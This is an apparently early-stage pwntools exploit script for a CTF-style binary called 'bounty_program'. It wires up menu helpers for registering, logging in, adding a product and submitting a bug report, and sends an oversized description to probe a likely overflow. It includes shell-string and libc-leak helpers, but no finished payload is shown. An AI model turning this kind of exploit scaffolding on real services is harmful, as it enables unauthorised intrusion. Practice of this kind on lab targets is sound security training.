#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./bounty_program', checksec=False)
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 1
USE_PTY = False
GDB_ATTACH_DELAY = 1

match TERMINAL:
    case 1:
        context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
    case 2:
        context.terminal = ["tmux", "split-window", "-h"]
    case 3:
        context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
                            "-w", "0", "split-pane", "-V", "-s", "0.5",
                            "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
    case _:
        raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
brva 0x180E
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def conn():
    if args.LOCAL:
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
        else:
            p = process([e.path])
        sleep(0.25)
        attach(p)
        return p
    else:
        host = "localhost"
        port = 1337
        return remote(host, port)

def Login(username, password):
    slan(p, b'choice', 1)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    
def Register(username, password, contact):
    slan(p, b'choice', 2)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sa(p, b'Contact', contact)

def AddNewProduct(name, company, comment):
    slan(p, b'choice', 1)
    sa(p, b'Name', name)
    sa(p, b'Company', company)
    sa(p, b'Comment', comment)

def SubmitBugReport(product_id, type_id, title, bug_id, desc_len, description):
    slan(p, b'choice', 3)
    slan(p, b'Product', product_id)
    slan(p, b'Type:', type_id)
    sa(p, b'Title', title)
    slan(p, b'ID', bug_id)
    slan(p, b'Length', desc_len)
    sa(p, b'Descripton', description)

p = conn()

username = b'ngtuonghung'
password = b'xincamon'
Register(username, password, b'1337')
Login(username, password)

slan(p, b'choice', 1)

AddNewProduct(b'iphone 18 pro max', b'apple', b'nah')
SubmitBugReport(0, 0, b'title', 1, 1500, A(150))

ia(p)